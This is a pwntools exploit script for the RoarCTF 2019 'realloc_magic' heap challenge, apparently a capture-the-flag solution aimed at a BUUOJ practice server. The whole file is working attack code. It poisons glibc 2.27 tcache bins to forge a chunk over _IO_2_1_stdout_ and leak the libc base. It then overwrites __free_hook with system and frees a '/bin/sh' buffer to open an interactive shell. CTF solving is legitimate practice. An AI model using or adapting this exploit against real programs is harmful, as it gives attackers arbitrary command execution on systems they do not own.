from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('roarctf_2019_realloc_magic')
io = remote('node4.buuoj.cn', 27159)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('roarctf_2019_realloc_magic')


def realloc(size, content):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size?', str(size))
    io.sendafter('Content?', content)


def free():
    io.sendlineafter('>> ', '2')


def clear_ptr():
    io.sendlineafter('>> ', '666')


def leak_libc():
    global libc_base
    realloc(0x18, 'a')              # chunk0 0x20
    realloc(0, '')
    realloc(0x88, 'b')              # chunk1 0x90
    realloc(0, '')
    realloc(0x28, 'c')              # chunk2 0x30
    realloc(0, '')
    realloc(0x88, 'b')              # chunk1 0x90
    for i in range(7):
        free()
    realloc(0, '')
    realloc(0x18, 'a')              # chunk0 0x20
    payload = b'a' * 0x10
    # change chunk1->size to put it in other tcache(0x40)
    # change chunk1->fd to put _IO_2_1_stdout_ in tcache(0x90)
    payload += p64(0) + p64(0x41) + p16(0x9760)
    realloc(0xa8, payload)          # chunk0+chunk1 0xb0
    realloc(0, '')
    realloc(0x88, 'b')              # chunk1 0x90
    realloc(0, '')
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0x58)
    realloc(0x88, payload)         # fake_chunk _IO_2_1_stdout_
    io.recvline()
    libc_base = u64(io.recvn(8)) - libc.sym['_IO_file_jumps']
    if (libc_base & 0xff0000000000) != 0x7f0000000000:
        quit()
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    clear_ptr()
    payload = b'a' * 0x10
    # change chunk1->size to put it in other tcache(0x30)
    # change chunk1->fd to put __free_hook in tcache(0x40)
    payload += p64(0) + p64(0x31) + p64(__free_hook - 8)
    realloc(0xa8, payload)          # chunk0+chunk1 0xb0
    realloc(0, '')
    realloc(0x38, 'b')              # chunk1 0x40
    realloc(0, '')
    realloc(0x38, b'/bin/sh\x00' + p64(system))     # fake_chunk __free_hook - 8
    free()
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()
